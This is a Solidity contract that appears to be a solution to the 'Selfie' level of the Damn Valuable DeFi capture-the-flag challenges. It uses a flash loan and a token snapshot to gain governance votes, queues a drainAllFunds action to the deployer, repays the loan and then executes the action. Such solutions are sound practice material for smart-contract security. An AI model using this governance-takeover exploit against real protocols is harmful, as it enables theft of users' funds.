pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "contracts/selfie/SimpleGovernance.sol";
import "contracts/selfie/SelfiePool.sol";
import "contracts/DamnValuableTokenSnapshot.sol";

contract SelfieAttacker{
    using Address for address payable;
    DamnValuableTokenSnapshot _token;
    SelfiePool _target;
    SimpleGovernance _gov;
    address deployer;
    uint256 actionId;

    constructor(address tokenAddress){
        _token = DamnValuableTokenSnapshot(tokenAddress);
        deployer = msg.sender;
    }

    function getGovernanceAndQueueAction(SelfiePool pool, SimpleGovernance gov, uint256 ammount)  external payable{
        _gov = gov;
        _target = pool;
        _target.flashLoan(ammount);
    }

    function receiveTokens(address token, uint256 ammount) external {
        _token.snapshot();
        bytes memory data = abi.encodeWithSignature(
                "drainAllFunds(address)",
                deployer
            );
        actionId = _gov.queueAction(address(_target), data, 0);
        _token.transfer(address(_target), ammount);
    }

    function exploit() external {
        _gov.executeAction(actionId);
    }

    receive() external payable{ }
}
